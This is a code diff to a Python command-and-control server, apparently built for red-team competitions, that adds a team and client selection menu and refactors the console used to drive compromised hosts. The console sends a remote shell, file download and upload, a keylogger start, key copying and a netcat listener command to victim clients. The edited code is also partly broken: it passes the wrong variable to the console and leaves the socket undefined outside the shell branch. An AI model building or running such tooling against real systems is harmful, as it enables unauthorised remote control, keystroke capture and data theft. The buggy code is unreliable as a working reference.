@@ -159,6 +159,43 @@ IP_FORMAT = "X.X.TEAM.HOST"
 #     SERVER_ADDR = sys.argv[1]
 #     SERVER_PORT = int(sys.argv[2])
 
+def selectClient():
+    selectedTeam = None
+    selectedClient = None
+    print("\nSelect Team")
+    if len(TEAMS) == 0:
+        print("No active teams!")
+        return
+    for team in TEAMS:
+        print(f"{TEAMS[team].identity} ({len(TEAMS[team].clients)})")
+    while not selectedTeam:
+        try:
+            x = input("Select a team: ")
+            if "exit" in x:
+                return
+            selectedTeam = TEAMS[x]
+        except:
+            pass
+    print("Select Client")
+    i = 0
+    if len(selectedTeam.clients) == 0:
+        print("Team has no clients!")
+        return
+    for client in selectedTeam.clients:
+        print(f"{i} - {str(client.IP)}")
+        #TODO FIX THIS FUNCTION TO SELECT A CLIENT FROM A TEAM
+        i += 1
+    while not selectedClient:
+        try:
+            x = input("Select a client: ")
+            if "exit" in x:
+                return
+            selectedClient = selectedTeam.clients[int(x)]
+        except:
+            pass
+    client_console(client)
+
+
 #Start server and listen for new connections
 def startServer():
     asciiArt = '''
@@ -263,7 +300,8 @@ def handleCommand():
             elif "mkteam" in cmd.lower():
                 addTeam(input("Input team name: "))
             elif "select" in cmd.lower() or "sel" in cmd.lower():
-                client_console(cmd)
+                selectClient()
+                # client_console(cmd)
                 # client,addr = select_client(cmd)
                 # if client == None:
                 #     print("Client does not exist!")
@@ -388,43 +426,45 @@ def assignLoop():
     #TODO add ability to reassign
 
 #Console to send commands to a client when user selects client
-def client_console(cmd):
+def client_console(client): #previously took in cmd
     try:
-        target = cmd.replace("select ", "")
-        target = cmd.replace("sel ", "")
-        target = int(target)
-        connection = CURRENT_CONNECTIONS_CLASS[target]
-        print("Connected to: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
+        # target = cmd.replace("select ", "")
+        # target = cmd.replace("sel ", "")
+        # target = int(target)
+        # connection = CURRENT_CONNECTIONS_CLASS[target]
+        connection = client
+
+        print("Connected to: " + str(client.IP) + ":" + str(client.port))
         while True:
-            print("Console: " + str(CURRENT_ADDRESSES[target][0])+">",end="")
+            print("Console: " + str(client.IP)+">",end="")
             newCMD = input()
             if "shell" in newCMD:
-                client = CURRENT_CONNECTIONS[target]
-                addr = CURRENT_ADDRESSES[target]
+                clientSock = connection
+                addr = client.getAddr()
                 if client == None:
                     print("Client does not exist!")
                 else:
-                    print("Active Shell On: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
-                    print("\n" + str(CURRENT_ADDRESSES[target][0]) + ">",end = '')
-                    handleClient(CURRENT_CONNECTIONS_CLASS[target])
+                    print("Active Shell On: " + str(client.IP) + ":" + str(client.port))
+                    print("\n" + str(client.IP) + ">",end = '')
+                    handleClient(clientSock)
             elif "dl" in newCMD: #Download file
-                download_file(newCMD,CURRENT_CONNECTIONS[target])
+                download_file(newCMD,clientSock)
             elif "up" in newCMD: #Upload file
-                upload_file(newCMD,CURRENT_CONNECTIONS[target])
+                upload_file(newCMD,clientSock)
             elif "keylogger" in newCMD:
-                start_keylog(newCMD, CURRENT_CONNECTIONS[target])
+                start_keylog(newCMD,clientSock)
             elif "tty" in newCMD:
-                startTTY(CURRENT_ADDRESSES[target][0])
+                startTTY(client.IP)
             elif "key" in newCMD.lower():
-                copyKey(CURRENT_CONNECTIONS[target])
+                copyKey(clientSock)
             elif "ncport" in newCMD.lower():
-                CURRENT_CONNECTIONS[target].send("ncport".encode())
-                print("Netcat is being hosted on: " + CURRENT_ADDRESSES[target][0] + ":" + CURRENT_CONNECTIONS[target].recv(BUFFER_SIZE).decode())
+                clientSock.socket.send("ncport".encode())
+                print("Netcat is being hosted on: " + client.IP + ":" + clientSock.socket.recv(BUFFER_SIZE).decode())
             elif "setnick" in newCMD.lower():
                 newCMD.replace("setnick","")
-                CURRENT_CONNECTIONS_CLASS[target].setNickName(newCMD)
+                clientSock.setNickName(newCMD)
             elif "reset" in newCMD.lower():
-                connection.getSocket().send("reset_connection".encode())
+                connection.socket.send("reset_connection".encode())
             elif "help" in newCMD: #Help menu
                 print("\nHelp Menu:\
                     \n\tUse 'exit' to return to main menu. \
